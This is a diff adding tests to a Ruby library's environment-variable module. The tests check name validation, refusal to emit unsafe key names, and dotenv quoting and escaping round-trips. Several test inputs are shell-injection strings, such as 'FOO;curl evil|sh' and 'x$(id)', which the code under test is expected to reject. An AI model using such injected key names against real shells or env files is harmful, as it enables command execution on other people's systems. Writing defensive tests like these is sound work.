@@ -62,3 +62,62 @@ Bone.export
 Bone.load_env!
 ENV.fetch('DB_HOST', nil)
 #=> 'localhost'
+
+# -- F1/F2: name validation + emit-time backstop --------------------------
+
+## valid_name? accepts shell/env identifiers
+%w[FOO _x A1 DB_URL].map { |n| Bone::Env.valid_name?(n) }
+#=> [true, true, true, true]
+
+## valid_name? rejects blanks, non-identifiers, and injection attempts
+['', '1abc', 'a-b', 'a b', 'a;b', 'a$b', 'a.b', 'FOO;curl evil|sh'].map { |n| Bone::Env.valid_name?(n) }
+#=> [false, false, false, false, false, false, false, false]
+
+## export refuses to emit a shell-injecting key name
+begin
+  Bone::Env.export({ 'x$(id)' => 'v' })
+  false
+rescue Bone::InvalidName
+  true
+end
+#=> true
+
+## dump refuses to emit a shell-injecting key name
+begin
+  Bone::Env.dump({ 'x$(id)' => 'v' })
+  false
+rescue Bone::InvalidName
+  true
+end
+#=> true
+
+## parse silently skips a malformed name line (import-from-string is safe)
+Bone::Env.parse("FOO;curl evil|sh=payload\nOK=1\n")
+#=> {'OK' => '1'}
+
+# -- F7: dotenv_quote escaping via Env.dump -------------------------------
+
+## dump double-quotes and escapes an embedded double quote
+Bone::Env.dump({ 'A' => 'a"b' })
+#=> 'A="a' + '\\' + '"b"' + "\n"
+
+## dump escapes a newline as backslash-n inside double quotes
+Bone::Env.dump({ 'A' => "a\nb" })
+#=> 'A="a' + '\\n' + 'b"' + "\n"
+
+## dump escapes a tab as backslash-t inside double quotes
+Bone::Env.dump({ 'A' => "a\tb" })
+#=> 'A="a' + '\\t' + 'b"' + "\n"
+
+## dump escapes a backslash by doubling it
+Bone::Env.dump({ 'A' => 'a\\b' })
+#=> 'A="a' + '\\\\' + 'b"' + "\n"
+
+## dump double-quotes an empty-string value
+Bone::Env.dump({ 'A' => '' })
+#=> 'A=""' + "\n"
+
+## parse(dump(x)) round-trips values mixing quotes, escapes, and empties
+@mixed = { 'A' => 'a"b', 'B' => "c\nd", 'C' => "e\tf", 'D' => 'g\\h', 'E' => '' }
+Bone::Env.parse(Bone::Env.dump(@mixed)) == @mixed
+#=> true
